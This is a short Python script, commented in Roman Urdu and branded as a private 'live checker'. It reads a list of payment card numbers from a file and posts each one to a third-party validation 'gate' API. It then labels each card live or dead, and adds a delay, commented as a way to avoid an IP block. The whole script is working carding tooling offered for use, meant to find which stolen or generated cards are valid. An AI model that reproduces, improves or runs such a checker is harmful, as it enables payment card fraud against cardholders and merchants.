import requests
import time

# --- ALI AHMED PRIVATE LIVE CHECKER ---
# 99% Accuracy Logic

def check_card(card):
    # Yeh ek example live gate hai (Actual URL aap private rakhna)
    # Hum yahan 'Requests' use karke card 'Hit' karte hain
    gate_url = "https://www.mrchecker.live/api/validate.php" # Filhal link yehi hai
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 9) AppleWebKit/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.mrchecker.live/"
    }
    
    payload = {"data": card}
    
    try:
        response = requests.post(gate_url, data=payload, headers=headers, timeout=10)
        res_text = response.text.lower()
        
        if "live" in res_text or "approved" in res_text:
            return f"✅ LIVE | {card}"
        elif "die" in res_text or "declined" in res_text:
            return f"❌ DEAD | {card}"
        else:
            return f"⚠️ UNKNOWN | {card}"
    except:
        return f"🚫 ERROR | Connection Timeout"

def main():
    print("\n--- ALI AHMED PRO CHECKER (v1.0) ---")
    file_path = input("[?] Enter your card list file (e.g. generated_cards.txt): ")
    
    try:
        with open(file_path, 'r') as f:
            cards = f.read().splitlines()
        
        print(f"[!] Total Cards Loaded: {len(cards)}\n")
        
        for card in cards:
            result = check_card(card)
            print(result)
            # Thora delay takay IP block na ho
            time.sleep(1)
            
    except FileNotFoundError:
        print("[-] File nahi mili!")

if __name__ == "__main__":
    main()
